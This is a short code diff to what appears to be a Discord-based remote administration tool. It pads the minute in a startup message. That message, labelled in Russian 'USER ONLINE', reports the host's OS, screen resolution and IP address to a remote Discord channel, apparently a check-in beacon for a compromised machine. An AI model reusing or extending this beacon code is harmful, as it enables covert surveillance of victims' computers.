@@ -30,10 +30,15 @@ async def on_ready():
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
+    minute = date.minute
+    if len(str(minute)) == 1:
+        minute = '0' + str(minute)
+    else:
+        pass
     embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='Configuration Administration Tool',
                           color=0x03fcec, )
 
-    embed.add_field(name='**Время запуска**', value=f'{date.hour}:{date.minute}', inline=False)
+    embed.add_field(name='**Время запуска**', value=f'{date.hour}:{minute}', inline=False)
     embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
     embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
     embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
